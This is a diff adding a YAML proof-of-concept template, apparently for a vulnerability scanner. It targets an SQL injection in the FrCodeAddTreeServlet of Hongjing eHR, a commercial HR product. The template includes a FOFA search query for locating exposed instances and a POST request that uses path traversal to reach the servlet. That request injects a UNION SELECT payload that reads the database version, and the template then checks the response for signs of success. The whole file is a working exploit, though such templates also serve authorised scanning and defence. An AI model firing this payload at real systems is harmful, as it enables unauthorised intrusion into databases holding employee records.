@@ -1,0 +1,18 @@
+id: poc-yaml-hjsoft-ehr-frcodeaddtreeservlet-sqli
+info:
+  name: 宏景eHR FrCodeAddTreeServlet SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: POST
+  path: /templates/attestation/../../servlet/FrCodeAddTreeServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
+  expression: status_code == 200 && contains(body,"Microsoft SQL Server") && contains(body,"<TreeNode>")
+    && contains(headers,"text/xml")
+variables: {}
+transport: http
